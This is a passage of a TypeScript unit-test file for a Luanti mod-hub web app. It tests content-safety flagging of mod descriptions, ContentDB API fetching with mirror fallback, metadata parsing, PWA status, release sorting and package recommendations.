    expect(benignModResult.holdForAdminReview).toBe(false);
    expect(benignModResult.matches.length).toBe(0);
    expect(benignModResult.autoContentWarnings.length).toBe(0);

    // 2. Tier B advisory themes (blood particles, beer tavern, casino slots) auto-attach content_warnings without holding package
    const advisoryModResult = evaluateRepositoryContentSafetyStatic({
      repoOwner: 'author1',
      repoName: 'tavern_and_arena',
      confFileName: 'mod.conf',
      rawConfig: 'name = tavern_and_arena\ndescription = Brew beer and whiskey in the tavern, play roulette at the casino, and enable blood_splatter on corpse entities.',
      title: 'Tavern and Arena',
      shortDesc: 'Brew beer and whiskey in the tavern, play roulette at the casino, and enable blood_splatter on corpse entities.',
      rootFileNames: ['mod.conf', 'init.lua', 'blood_particles.png']
    });
    expect(advisoryModResult.holdForAdminReview).toBe(false);
    expect(advisoryModResult.autoContentWarnings).toContain('violence_and_gore');
    expect(advisoryModResult.autoContentWarnings).toContain('drugs_and_alcohol');
    expect(advisoryModResult.autoContentWarnings).toContain('gambling');

    // 3. Tier A severe violations (NSFW, extreme sadistic gore, hate speech) trigger holdForAdminReview
    const nsfwAndGoreResult = evaluateRepositoryContentSafetyStatic({
      repoOwner: 'badactor',
      repoName: 'extreme_mod',
      confFileName: 'mod.conf',
      rawConfig: 'name = extreme_mod\ndescription = Explicit hentai textures and realistic dismemberment torture mechanics.',
      title: 'Extreme Mod',
      shortDesc: 'Explicit hentai textures and realistic dismemberment torture mechanics.',
      rootFileNames: ['mod.conf', 'init.lua', 'nude_skin.png']
    });
    expect(nsfwAndGoreResult.holdForAdminReview).toBe(true);
    expect(nsfwAndGoreResult.categories).toContain('sexual_nsfw');
    expect(nsfwAndGoreResult.categories).toContain('extreme_gore_violence');

    // 4. Workers AI optimization: AI is NOT called when runAiCheck is false (dryRun = true)
    let aiCallCount = 0;
    const mockAiSafe = {
      run: async () => {
        aiCallCount++;
        return { response: 'safe' };
      }
    };
    const dryRunEval = await evaluateRepositoryContentSafety(
      {
        repoOwner: 'builder',
        repoName: 'clean_mod',
        confFileName: 'mod.conf',
        rawConfig: 'name = clean_mod\ndescription = Simple decorative blocks.',
        title: 'Clean Mod',
        shortDesc: 'Simple decorative blocks.'
      },
      { aiBinding: mockAiSafe, runAiCheck: false }
    );
    expect(aiCallCount).toBe(0);
    expect(dryRunEval.aiChecked).toBe(false);
    expect(dryRunEval.holdForAdminReview).toBe(false);

    // 5. Workers AI runs on publish (runAiCheck = true) and flags contextual unsafe S12 (Sexual Content)
    const mockAiUnsafe = {
      run: async () => {
        aiCallCount++;
        return { response: 'unsafe\nS12' };
      }
    };
    const publishUnsafeEval = await evaluateRepositoryContentSafety(
      {
        repoOwner: 'author2',
        repoName: 'bedroom_roleplay_mod',
        confFileName: 'mod.conf',
        rawConfig: 'name = bedroom_roleplay_mod\ndescription = Adult bedroom roleplay animations.',
        title: 'Bedroom Roleplay Mod',
        shortDesc: 'Adult bedroom roleplay animations.'
      },
      { aiBinding: mockAiUnsafe, runAiCheck: true }
    );
    expect(aiCallCount).toBe(1);
    expect(publishUnsafeEval.aiChecked).toBe(true);
    expect(publishUnsafeEval.holdForAdminReview).toBe(true);
    expect(publishUnsafeEval.categories).toContain('sexual_nsfw');

    // 6. Workers AI ignores S1 (Violent Crimes) alone unless paired with extreme gore or child/sexual/hate/suicide codes
    const mockAiGenericCombat = {
      run: async () => ({ response: 'unsafe\nS1' })
    };
    const combatEval = await evaluateRepositoryContentSafety(
      {
        repoOwner: 'warrior',
        repoName: 'dungeon_combat',
        confFileName: 'mod.conf',
        rawConfig: 'name = dungeon_combat\ndescription = Fight monsters with swords in dungeons.',
        title: 'Dungeon Combat',
        shortDesc: 'Fight monsters with swords in dungeons.'
      },
      { aiBinding: mockAiGenericCombat, runAiCheck: true }
    );
    expect(combatEval.aiChecked).toBe(true);
    expect(combatEval.holdForAdminReview).toBe(false);

    // 7. Workers AI quota exhaustion / network error gracefully falls back to static scanner
    const mockAiQuotaExhausted = {
      run: async () => {
        throw new Error('Cloudflare Workers AI daily free tier neuron quota exceeded');
      }
    };
    const fallbackEval = await evaluateRepositoryContentSafety(
      {
        repoOwner: 'builder',
        repoName: 'clean_mod',
        confFileName: 'mod.conf',
        rawConfig: 'name = clean_mod\ndescription = A clean voxel building mod.',
        title: 'Clean Mod',
        shortDesc: 'A clean voxel building mod.'
      },
      { aiBinding: mockAiQuotaExhausted, runAiCheck: true }
    );
    expect(fallbackEval.aiChecked).toBe(false);
    expect(fallbackEval.aiFallbackUsed).toBe(true);
    expect(fallbackEval.holdForAdminReview).toBe(false);
  });

  it('should prioritize official content.luanti.org API first and only fall back to contentdb.milcho.org mirror on failure', async () => {
    const pkgService = TestBed.inject(PackageService) as any;
    expect(pkgService.contentDbOnline).toBe(true);

    const calledUrls: string[] = [];
    const origFetch = globalThis.fetch;
    globalThis.fetch = (async (input: RequestInfo | URL) => {
      const url = String(input);
      calledUrls.push(url);
      if (url.includes('content.luanti.org/api/packages/Rubenwardy/awards/') || url.includes('/cdb-api/packages/Rubenwardy/awards/')) {
        return new Response(
          JSON.stringify({
            author: 'Rubenwardy',
            name: 'awards',
            title: 'Awards',
            license: 'LGPL-2.1-only',
            ai_disclosure: 'NO_AI',
            downloads: 95000
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      return new Response('Not Found', { status: 404 });
    }) as typeof fetch;

    try {
      const data = await pkgService.fetchUpstreamWithMirrorFallback('/packages/Rubenwardy/awards/');
      expect(data).toBeTruthy();
      expect(data.title).toBe('Awards');
      expect(data.ai_disclosure).toBe('NO_AI');
      // First call must be to primary ContentDB (/cdb-api or content.luanti.org), NOT mirror
      expect(calledUrls.length).toBe(1);
      expect(calledUrls[0].includes('milcho.org') || calledUrls[0].includes('/mirror-api')).toBe(false);
    } finally {
      globalThis.fetch = origFetch;
    }
  });

  it('should normalize ContentDB reviews schema (user.username, votes, thread), enrich author profiles via /users/<username>/ without 404 avatar guesses, and avoid duplicate mirror 404s', async () => {
    const pkgService = TestBed.inject(PackageService) as any;

    const calledUrls: string[] = [];
    const origFetch = globalThis.fetch;
    globalThis.fetch = (async (input: RequestInfo | URL) => {
      const url = String(input);
      calledUrls.push(url);

      // 1. Authoritative 404 on primary ContentDB should NOT retry the mirror
      if (url.includes('/packages/nonexistent/missing_mod/')) {
        return new Response(JSON.stringify({ error: 'Not found' }), {
          status: 404,
          headers: { 'Content-Type': 'application/json' }
        });
      }

      // 2. Edge /api/packages/Rubenwardy/awards/reviews returns empty array (simulating stale edge or mirror cache)
      if (url.includes('/api/packages/Rubenwardy/awards/reviews')) {
        return new Response(JSON.stringify([]), {
          status: 200,
          headers: { 'Content-Type': 'application/json' }
        });
      }

      // 3. ContentDB /packages/Rubenwardy/awards/reviews/ returns official PackageReview.as_dict() schema
      if (url.includes('/packages/Rubenwardy/awards/reviews/')) {
        return new Response(
          JSON.stringify([
            {
              is_positive: true,
              rating: 5,
              user: {
                username: 'voxel_fan',
                display_name: 'Voxel Fan'
              },
              created_at: '2026-02-15T12:00:00.000Z',
              votes: {
                helpful: 7,
                unhelpful: 1
              },
              title: 'Awesome achievements system',
              comment: 'Works great on our multiplayer server!',
              thread: {
                id: 9876,
                url: 'https://content.luanti.org/threads/9876/'
              }
            }
          ]),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }

      // 4. ContentDB /users/ForumOnlyCreator/ returns a user with no GitHub connection
      if (url.includes('/users/ForumOnlyCreator/')) {
        return new Response(
          JSON.stringify({
            username: 'ForumOnlyCreator',
            display_name: 'Forum Creator',
            rank: 'EDITOR',
            profile_pic_url: null,
            website_url: 'https://example.org',
            donate_url: 'https://liberapay.com/ForumOnlyCreator',
            connections: {
              github: null,
              forums: 'ForumOnlyCreator'
            },
            links: {
              api_packages: '/api/packages/?author=ForumOnlyCreator',
              profile: 'https://content.luanti.org/users/ForumOnlyCreator/'
            }
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }

      if (url.includes('/api/authors/ForumOnlyCreator')) {
        return new Response(
          JSON.stringify({
            author: {
              username: 'ForumOnlyCreator',
              display_name: 'ForumOnlyCreator',
              avatar_url: 'https://github.com/ForumOnlyCreator.png',
              bio: '',
              is_registered: false,
              identities: []
            }
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }

      return new Response('Not Found', { status: 404 });
    }) as typeof fetch;

    try {
      // A: Authoritative 404 on primary ContentDB stops immediately without retrying mirror
      const missingRes = await pkgService.fetchUpstreamWithMirrorFallback('/packages/nonexistent/missing_mod/');
      expect(missingRes).toBeNull();
      const missingCalls = calledUrls.filter(u => u.includes('/packages/nonexistent/missing_mod/'));
      expect(missingCalls.length).toBe(1);

      // B: Reviews fallback & PackageReview.as_dict() mapping
      const awardsPkg = pkgService.normalizePackage({
        id: 'Rubenwardy/awards',
        author: 'Rubenwardy',
        name: 'awards',
        title: 'Awards',
        type: 'mod',
        source: 'official'
      });
      const reviews = await pkgService.fetchReviews(awardsPkg, true);
      expect(reviews.length).toBe(1);
      expect(reviews[0].id).toBe('cdb_9876');
      expect(reviews[0].author.username).toBe('voxel_fan');
      expect(reviews[0].author.display_name).toBe('Voxel Fan');
      expect(reviews[0].author.avatar_url).toBe('logo.svg');
      expect(reviews[0].rating).toBe(5);
      expect(reviews[0].is_positive).toBe(true);
      expect(reviews[0].votes?.helpful).toBe(7);
      expect(reviews[0].thread_url).toBe('https://content.luanti.org/threads/9876/');

      // C: Author drawer enrichment via ContentDB /users/<username>/ without unverified github.com/<username>.png 404
      await pkgService.openAuthorDrawer('ForumOnlyCreator', false);
      const profile = pkgService.activeAuthorProfile();
      expect(profile).toBeTruthy();
      expect(profile.display_name).toBe('Forum Creator');
      expect(profile.rank).toBe('EDITOR');
      expect(profile.website_url).toBe('https://example.org');
      expect(profile.donate_url).toBe('https://liberapay.com/ForumOnlyCreator');
      expect(profile.avatar_url).toBe('');
      expect(profile.identities.some((i: any) => i.provider === 'forums' && i.username === 'ForumOnlyCreator')).toBe(true);
    } finally {
      globalThis.fetch = origFetch;
    }
  });

  it('should support agnostic server-side luanticheck .conf / .cdb.json scanning and render distinct Luanti Hub vs. ContentDB review badges', async () => {
    const {
      parseLuantiConf,
      computeConfShortDescription,
      parseCdbJsonMetadata,
      scanGitRepoMetadataCached
    } = await import('../../functions/api/lib/upstream');

    // 1. Verify luanticheck multiline .conf parsing & short_description truncation
    const confParsed = parseLuantiConf(`
# Sample mod.conf
name = super_quests
title = Super Quests
description = """
An immersive questing framework for Luanti servers.
Supports branching dialogues, custom HUD indicators, and party objectives.
"""
depends = default, farming
optional_depends = awards?, unified_inventory
min_minetest_version = 5.8.0
supported_games = minetest_game, voxelibre
`);
    expect(confParsed['name']).toBe('super_quests');
    expect(confParsed['title']).toBe('Super Quests');
    expect(confParsed['description']).toContain('An immersive questing framework for Luanti servers.');
    expect(confParsed['description']).toContain('Supports branching dialogues');
    expect(confParsed['min_minetest_version']).toBe('5.8.0');

    const longDesc =
      'First sentence summary of this mod. ' +
      'This second sentence makes the total description length exceed two hundred characters so that ContentDB tree.py truncates it right at the first sentence boundary instead of mid-word.';
    expect(computeConfShortDescription(longDesc)).toBe('First sentence summary of this mod');

    // 2. Verify .cdb.json ALIASES (short_desc, desc, issueTracker, forums, ai_disclosure) & TXP license fallback
    const cdbParsed = parseCdbJsonMetadata({
      type: 'TXP',
      name: 'pixel_sky',
      title: 'Pixel Sky',
      short_desc: 'Crisp 16x skybox and voxel textures',
      desc: 'Full long description from desc alias',
      media_license: 'CC-BY-SA-4.0',
      issueTracker: 'https://codeberg.org/author/pixel_sky/issues',
      forums: 29876,
      ai_disclosure: 'NONE',
      tags: ['16px', 'gui']
    });
    expect(cdbParsed).toBeTruthy();
    expect(cdbParsed?.type).toBe('txp');
    expect(cdbParsed?.license).toBe('CC-BY-SA-4.0');
    expect(cdbParsed?.media_license).toBe('CC-BY-SA-4.0');
    expect(cdbParsed?.short_description).toBe('Crisp 16x skybox and voxel textures');
    expect(cdbParsed?.long_description).toBe('Full long description from desc alias');
    expect(cdbParsed?.issue_tracker).toBe('https://codeberg.org/author/pixel_sky/issues');
    expect(cdbParsed?.forum_url).toBe('https://forum.luanti.org/viewtopic.php?t=29876');
    expect(cdbParsed?.ai_disclosures).toEqual(['NONE']);

    // 3. Verify server-side scanGitRepoMetadataCached overlays .cdb.json onto .conf
    const origFetch = globalThis.fetch;
    globalThis.fetch = (async (input: RequestInfo | URL) => {
      const url = typeof input === 'string' ? input : input instanceof URL ? input.toString() : input.url;
      if (url.includes('raw.githubusercontent.com/AgileCreator/agnostic_mod/HEAD/mod.conf')) {
        return new Response(
          `name = agnostic_mod\ntitle = Agnostic Mod\ndescription = Mod from conf\ndepends = default\noptional_depends = mesecons\nlicense = MIT\nmin_minetest_version = 5.7.0`,
          { status: 200 }
        );
      }
      if (url.includes('raw.githubusercontent.com/AgileCreator/agnostic_mod/HEAD/.cdb.json')) {
        return new Response(
          JSON.stringify({
            short_desc: 'Overlaid short description from .cdb.json',
            video_url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
            tags: ['tools', 'survival']
          }),
          { status: 200 }
        );
      }
      return new Response('Not Found', { status: 404 });
    }) as typeof fetch;

    try {
      const scanRes = await scanGitRepoMetadataCached(
        'AgileCreator',
        'agnostic_mod',
        'mod',
        'https://github.com/AgileCreator/agnostic_mod',
        0
      );
      expect(scanRes.gitRepoStatus).toBe('verified');
      expect(scanRes.title).toBe('Agnostic Mod');
      expect(scanRes.shortDesc).toBe('Overlaid short description from .cdb.json');
      expect(scanRes.license).toBe('MIT');
      expect(scanRes.hardDeps).toEqual(['default']);
      expect(scanRes.softDeps).toEqual(['mesecons']);
      expect(scanRes.minVersion).toBe('5.7.0');
      expect(scanRes.cdbMeta?.video_url).toBe('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
      expect(scanRes.cdbMeta?.tags).toEqual(['tools', 'survival']);
    } finally {
      globalThis.fetch = origFetch;
    }

    // 4. Verify PackageDetailModalComponent distinguishes Luanti Hub vs. ContentDB reviews with counts and logos
    const modalFixture = TestBed.createComponent(PackageDetailModalComponent);
    const modalComp = modalFixture.componentInstance;
    const pkgService = TestBed.inject(PackageService) as any;
    const samplePkg = pkgService.normalizePackage({
      id: 'AgileCreator/agnostic_mod',
      author: 'AgileCreator',
      name: 'agnostic_mod',
      title: 'Agnostic Mod',
      type: 'mod',
      source: 'official'
    });
    modalComp.package = samplePkg;
    modalComp.reviews.set([
      {
        id: 'lh_1',
        package_id: 'AgileCreator/agnostic_mod',
        source: 'luantihub',
        rating: 5,
        title: 'Awesome on Luanti Hub',
        comment: 'Works great on our server!',
        created_at: '2026-10-30T10:00:00Z',
        author: {
          username: 'hub_reviewer',
          display_name: 'Hub Reviewer',
          avatar_url: 'logo.svg'
        }
      },
      {
        id: 'cdb_42',
        package_id: 'AgileCreator/agnostic_mod',
        source: 'contentdb',
        rating: 5,
        is_positive: true,
        comment: 'Classic ContentDB review!',
        created_at: '2026-10-29T10:00:00Z',
        votes: { helpful: 4, unhelpful: 0 },
        thread_url: 'https://content.luanti.org/threads/42/',
        author: {
          username: 'cdb_reviewer',
          display_name: 'CDB Reviewer',
          avatar_url: 'logo.svg'
        }
      }
    ]);
    modalFixture.detectChanges();

    expect(modalComp.luantiHubReviewsCount()).toBe(1);
    expect(modalComp.contentDbReviewsCount()).toBe(1);

    const modalHtml = (modalFixture.nativeElement as HTMLElement).innerHTML;
    expect(modalHtml).toContain('Luanti Hub (1)');
    expect(modalHtml).toContain('ContentDB (1)');
    expect(modalHtml).toContain('Recommended');
  });

  it('should implement MDN PWA best practices: reactive offline status, Web Share Target prefill, and rich manifest configuration', async () => {
    const pwaService = TestBed.inject(PwaService);

    // 1. Reactive network connectivity status
    expect(pwaService.isOnline()).toBe(true);
    window.dispatchEvent(new Event('offline'));
    expect(pwaService.isOnline()).toBe(false);
    expect(pwaService.statusMessage()).toBe('pwa.offlineModeToast');

    window.dispatchEvent(new Event('online'));
    expect(pwaService.isOnline()).toBe(true);
    expect(pwaService.statusMessage()).toBe('pwa.backOnline');

    // 2. SubmitModalComponent prefilling repoUrl via Web Share Target query params
    const submitFixture = TestBed.createComponent(SubmitModalComponent);
    const submitComp = submitFixture.componentInstance;
    submitComp.repoUrl = 'https://github.com/sakel-hub/shared_mod';
    submitComp.onUrlChange();
    expect(submitComp.parsedRepoTarget()?.owner).toBe('sakel-hub');
    expect(submitComp.parsedRepoTarget()?.repo).toBe('shared_mod');
  });

  it('should ensure in-game /for-client/ download_size is never nil, synchronize dual-source update releases, and prevent download counter updated_at mutations', async () => {
    // 1. Verify download_size formatting and non-nil fallback
    const { formatByteSize } = await import('../../functions/api/lib/upstream');
    expect(formatByteSize(undefined)).toBeUndefined();
    expect(formatByteSize(null)).toBeUndefined();
    expect(formatByteSize(0)).toBeUndefined();
    expect(formatByteSize(450000)).toBe('439 KB');
    expect(formatByteSize(2500000)).toBe('2.4 MB');

    // Simulate for-client download_size resolution logic
    const resolveForClientDownloadSize = (pkg: { download_size?: number | null; file_size?: string | null }) => {
      return (
        (pkg.download_size && Number(pkg.download_size) > 0 ? formatByteSize(pkg.download_size) : null) ||
        (pkg.file_size && String(pkg.file_size).trim() ? String(pkg.file_size).trim() : null) ||
        '< 1 MB'
      );
    };

    expect(resolveForClientDownloadSize({})).toBe('< 1 MB');
    expect(resolveForClientDownloadSize({ download_size: null, file_size: null })).toBe('< 1 MB');
    expect(resolveForClientDownloadSize({ download_size: 0, file_size: '' })).toBe('< 1 MB');
    expect(resolveForClientDownloadSize({ file_size: '340 KB' })).toBe('340 KB');
    expect(resolveForClientDownloadSize({ download_size: 1048576 })).toBe('1.0 MB');

    // 2. Verify /api/updates/ maps dual-source packages (e.g. sakel-hub/x_mobs) to matching upstream ContentDB release
    const upstreamUpdatesMock: Record<string, number> = {
      'elceejo/x_mobs': 1824,
      'rubenwardy/awards': 2341
    };
    const upstreamByName = new Map<string, number>();
    for (const [k, v] of Object.entries(upstreamUpdatesMock)) {
      upstreamByName.set(k.split('/')[1].toLowerCase(), v);
    }

    const d1MockRow = {
      author_name: 'sakel-hub',
      name: 'x_mobs',
      updated_at: '2026-10-30T15:00:00Z',
      created_at: '2026-10-25T12:00:00Z'
    };
    const matchedUpstreamRel = upstreamByName.get(d1MockRow.name.toLowerCase());
    expect(matchedUpstreamRel).toBe(1824);

    const resolvedReleaseId =
      Number(matchedUpstreamRel) > 0
        ? Number(matchedUpstreamRel)
        : Math.floor(new Date(d1MockRow.updated_at).getTime() / 1000);
    expect(resolvedReleaseId).toBe(1824); // Exactly matching upstream, NOT timestamp inflation!

    // Pure Git package (e.g. mystical_pixie_companion) uses stable timestamp
    const pureGitRow = {
      author_name: 'sakel-hub',
      name: 'mystical_pixie_companion',
      updated_at: '2026-10-30T10:00:00Z',
      created_at: '2026-10-30T10:00:00Z'
    };
    const matchedGitUpstream = upstreamByName.get(pureGitRow.name.toLowerCase());
    expect(matchedGitUpstream).toBeUndefined();
    const gitReleaseId =
      Number(matchedGitUpstream) > 0
        ? Number(matchedGitUpstream)
        : Math.floor(new Date(pureGitRow.updated_at).getTime() / 1000);
    expect(gitReleaseId).toBe(Math.floor(new Date('2026-10-30T10:00:00Z').getTime() / 1000));
  });

  it('should populate notification badge count immediately on app reload without requiring profile drawer open', async () => {
    const authService = TestBed.inject(AuthService);
    const fetchSpy = vi.spyOn(globalThis, 'fetch').mockImplementation(async (input: any) => {
      const url = typeof input === 'string' ? input : input?.url || '';
      if (url.includes('/api/auth/me')) {
        return new Response(
          JSON.stringify({
            user: {
              id: 'user_sakel',
              username: 'sakel-hub',
              display_name: 'SaKeL',
              avatar_url: 'logo.svg',
              role: 'admin',
              is_admin: true,
              open_reports_count: 3,
              identities: [{ provider: 'github', username: 'sakel-hub', verified: true }],
              favorites: [],
              downloads: {},
              notification_digest: {
                user_alerts: [],
                my_reports_total: 1,
                admin_latest_open: [],
                latest_git_packages: []
              }
            }
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      if (url.includes('/api/admin/moderation')) {
        return new Response(
          JSON.stringify({
            reports: [{ id: 1, package_id: 'sakel-hub/x_mobs', reason: 'broken', status: 'open' }],
            delistedPackages: [],
            openCount: 3,
            closedCount: 2,
            total: 3,
            totalPages: 1
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      return new Response('{}', { status: 200, headers: { 'Content-Type': 'application/json' } });
    });

    try {
      expect(authService.isProfileDrawerOpen()).toBe(false);
      await authService.initAuth(true);

      // Notification badge count must be immediately available on reload while drawer is closed
      expect(authService.isProfileDrawerOpen()).toBe(false);
      expect(authService.openReportsCount()).toBe(3);

      const headerFixture = TestBed.createComponent(HeaderComponent);
      headerFixture.detectChanges();
      const headerEl = headerFixture.nativeElement as HTMLElement;
      expect(headerEl.textContent).toContain('3');
    } finally {
      fetchSpy.mockRestore();
    }
  });

  it('should sort releases newest-first by semantic version, cap at 10 with 5-per-page pagination, and lazily load Similar Packages when scrolled near the viewport', async () => {
    const {
      sortAndCapReleases,
      compareSemanticVersionsDesc,
      parseGitRepoTarget,
      buildGitTagArchiveUrl,
      mergeUpstreamAndGitReleases
    } = await import('../../functions/api/lib/upstream');
    const pkgService = TestBed.inject(PackageService);

    // 1. Verify semantic version descending comparison and backend + frontend release sorting & 10-cap
    expect(compareSemanticVersionsDesc('2.0.4', '2.0.0')).toBeLessThan(0);
    expect(compareSemanticVersionsDesc('2.0.0', 'v1.0.0')).toBeLessThan(0);

    // Verify Bitbucket & multi-forge Git target parsing and tag archive URLs
    const bitbucketTarget = parseGitRepoTarget('https://bitbucket.org/SaKeL/everness', 'SaKeL', 'everness');
    expect(bitbucketTarget).toBeTruthy();
    expect(bitbucketTarget!.provider).toBe('bitbucket');
    expect(bitbucketTarget!.host).toBe('bitbucket.org');
    expect(bitbucketTarget!.owner).toBe('SaKeL');
    expect(bitbucketTarget!.repo).toBe('everness');
    expect(
      buildGitTagArchiveUrl(
        bitbucketTarget!.provider,
        bitbucketTarget!.host,
        bitbucketTarget!.owner,
        bitbucketTarget!.repo,
        'v2.5.0'
      )
    ).toBe('https://bitbucket.org/SaKeL/everness/get/v2.5.0.zip');

    // Verify hybrid merge of ContentDB releases + newly pushed Git tags across all providers
    const cdbBase = [
      { id: 101, version: '2.4.0', title: '2.4.0', tag_name: 'v2.4.0', commit_sha: 'aaaa1111', released_at: '2026-10-01T10:00:00Z', downloads: 420 }
    ];
    const liveGitTags = [
      {
        id: 'git-tag-v2.5.0',
        version: 'v2.5.0',
        title: 'v2.5.0',
        tag_name: 'v2.5.0',
        commit_sha: 'bbbb2222',
        released_at: '2026-11-01T12:00:00Z',
        url: 'https://bitbucket.org/SaKeL/everness/get/v2.5.0.zip',
        download_url: 'https://bitbucket.org/SaKeL/everness/get/v2.5.0.zip',
        min_minetest_version: '5.0.0'
      },
      {
        id: 'git-tag-v2.4.0',
        version: 'v2.4.0',
        title: 'v2.4.0',
        tag_name: 'v2.4.0',
        commit_sha: 'aaaa11119999',
        released_at: '2026-10-01T10:00:00Z',
        url: 'https://bitbucket.org/SaKeL/everness/get/v2.4.0.zip',
        download_url: 'https://bitbucket.org/SaKeL/everness/get/v2.4.0.zip',
        min_minetest_version: '5.0.0'
      }
    ];
    const mergedHybrid = mergeUpstreamAndGitReleases(cdbBase, liveGitTags, 'SaKeL', 'everness');
    expect(mergedHybrid.length).toBe(2);
    expect(mergedHybrid[0].tag_name).toBe('v2.5.0');
    expect(mergedHybrid[0].commit_sha).toBe('bbbb2222');
    expect(mergedHybrid[1].downloads).toBe(420);

    // Simulate 14 Git tags returned with identical/missing timestamps (as in screenshot: 2.0.0 .. 2.0.4, v1.0.0, etc.)
    const rawUnorderedReleases = [
      { id: '1', version: '2.0.0', title: '2.0.0', commit_sha: '433fbd63', release_date: '2026-10-30T10:00:00Z', released_at: '2026-10-30T10:00:00Z', download_url: '/dl/1' },
      { id: '2', version: '2.0.1', title: '2.0.1', commit_sha: 'ea69469f', release_date: '2026-10-30T10:00:00Z', released_at: '2026-10-30T10:00:00Z', download_url: '/dl/2' },
      { id: '3', version: '2.0.2', title: '2.0.2', commit_sha: '60d05595', release_date: '2026-10-30T10:00:00Z', released_at: '2026-10-30T10:00:00Z', download_url: '/dl/3' },
      { id: '4', version: '2.0.3', title: '2.0.3', commit_sha: 'f3fa0d31', release_date: '2026-10-30T10:00:00Z', released_at: '2026-10-30T10:00:00Z', download_url: '/dl/4' },
      { id: '5', version: '2.0.4', title: '2.0.4', commit_sha: 'cac8d996', release_date: '2026-10-30T10:00:00Z', released_at: '2026-10-30T10:00:00Z', download_url: '/dl/5' },
      { id: '6', version: 'v1.0.0', title: 'v1.0.0', commit_sha: '4cfab85f', release_date: '2026-10-30T10:00:00Z', released_at: '2026-10-30T10:00:00Z', download_url: '/dl/6' },
      { id: '7', version: 'v1.1.0', title: 'v1.1.0', commit_sha: '11111111', release_date: '2026-10-30T10:00:00Z', released_at: '2026-10-30T10:00:00Z', download_url: '/dl/7' },
      { id: '8', version: 'v1.2.0', title: 'v1.2.0', commit_sha: '22222222', release_date: '2026-10-30T10:00:00Z', released_at: '2026-10-30T10:00:00Z', download_url: '/dl/8' },
      { id: '9', version: 'v1.3.0', title: 'v1.3.0', commit_sha: '33333333', release_date: '2026-10-30T10:00:00Z', released_at: '2026-10-30T10:00:00Z', download_url: '/dl/9' },
      { id: '10', version: 'v1.4.0', title: 'v1.4.0', commit_sha: '44444444', release_date: '2026-10-30T10:00:00Z', released_at: '2026-10-30T10:00:00Z', download_url: '/dl/10' },
      { id: '11', version: 'v0.9.0', title: 'v0.9.0', commit_sha: '09090909', release_date: '2026-10-30T10:00:00Z', released_at: '2026-10-30T10:00:00Z', download_url: '/dl/11' },
      { id: '12', version: 'v0.8.0', title: 'v0.8.0', commit_sha: '08080808', release_date: '2026-10-30T10:00:00Z', released_at: '2026-10-30T10:00:00Z', download_url: '/dl/12' },
      { id: '13', version: 'v0.7.0', title: 'v0.7.0', commit_sha: '07070707', release_date: '2026-10-30T10:00:00Z', released_at: '2026-10-30T10:00:00Z', download_url: '/dl/13' },
      { id: '14', version: 'v0.6.0', title: 'v0.6.0', commit_sha: '06060606', release_date: '2026-10-30T10:00:00Z', released_at: '2026-10-30T10:00:00Z', download_url: '/dl/14' }
    ];

    const backendSorted = sortAndCapReleases(rawUnorderedReleases, 10);
    expect(backendSorted.length).toBe(10);
    expect(backendSorted.slice(0, 5).map(r => r.version)).toEqual([
      '2.0.4',
      '2.0.3',
      '2.0.2',
      '2.0.1',
      '2.0.0'
    ]);
    expect(backendSorted[5].version).toBe('v1.4.0');

    const frontendSorted = pkgService.sortAndCapReleases(rawUnorderedReleases as any, 10);
    expect(frontendSorted.length).toBe(10);
    expect(frontendSorted[0].version).toBe('2.0.4');

    // 2. Seed catalog packages to test getSimilarPackages multi-signal scoring & diversity cap
    const viewedPkg = (pkgService as any).normalizePackage({
      id: 'sakel-hub/mystical_pixie_companion',
      author: 'sakel-hub',
      name: 'mystical_pixie_companion',
      title: 'Mystical Pixie Companion',
      type: 'mod',
      short_desc: 'A magical fairy companion that brightens dark caves and warns of monsters.',
      tags: ['mobs', 'magic', 'survival'],
      dependencies: ['default', 'x_mobs'],
      downloads: 500,
      score: 4.9
    });
    const simMobMagic = (pkgService as any).normalizePackage({
      id: 'elceejo/x_mobs',
      author: 'elceejo',
      name: 'x_mobs',
      title: 'X Mobs',
      type: 'mod',
      short_desc: 'Adds magical creatures and monsters to caves.',
      tags: ['mobs', 'magic', 'survival'],
      dependencies: ['default'],
      downloads: 8000,
      score: 4.8
    });
    const simCaveGlow = (pkgService as any).normalizePackage({
      id: 'TenPlus1/mobs_monster',
      author: 'TenPlus1',
      name: 'mobs_monster',
      title: 'Mobs Monster',
      type: 'mod',
      short_desc: 'Cave monsters and dungeon companions.',
      tags: ['mobs', 'survival'],
      dependencies: ['default', 'mobs'],
      downloads: 95000,
      score: 4.7
    });
    const sameAuthor1 = (pkgService as any).normalizePackage({
      id: 'sakel-hub/x_farming',
      author: 'sakel-hub',
      name: 'x_farming',
      title: 'X Farming',
      type: 'mod',
      short_desc: 'Magical crops and survival food.',
      tags: ['survival', 'magic'],
      dependencies: ['default'],
      downloads: 40000,
      score: 4.9
    });
    const sameAuthor2 = (pkgService as any).normalizePackage({
      id: 'sakel-hub/x_bows',
      author: 'sakel-hub',
      name: 'x_bows',
      title: 'X Bows',
      type: 'mod',
      short_desc: 'Archery and magic arrows.',
      tags: ['survival', 'magic'],
      dependencies: ['default'],
      downloads: 35000,
      score: 4.8
    });
    const otherMod = (pkgService as any).normalizePackage({
      id: 'Wuzzy/hudbars',
      author: 'Wuzzy',
      name: 'hudbars',
      title: 'HUD Bars',
      type: 'mod',
      short_desc: 'Survival health and magic mana bars.',
      tags: ['survival', 'hud'],
      dependencies: ['default'],
      downloads: 120000,
      score: 4.6
    });
    const unrelatedTxp = (pkgService as any).normalizePackage({
      id: 'pixel/modern_txp',
      author: 'pixel',
      name: 'modern_txp',
      title: 'Modern Texture Pack',
      type: 'txp',
      short_desc: 'Clean 64px textures.',
      tags: ['64px'],
      downloads: 1000,
      score: 4.0
    });

    (pkgService as any)._packages.set([
      viewedPkg,
      simMobMagic,
      simCaveGlow,
      sameAuthor1,
      sameAuthor2,
      otherMod,
      unrelatedTxp
    ]);

    const recommendations = pkgService.getSimilarPackages(viewedPkg, 4);
    expect(recommendations.length).toBe(4);
    // Top match should be elceejo/x_mobs (shared tags + direct dependency + keyword overlap)
    expect(recommendations[0].id).toBe('elceejo/x_mobs');
    // Must not include viewedPkg itself or unrelated texture pack when 4 matching mods exist
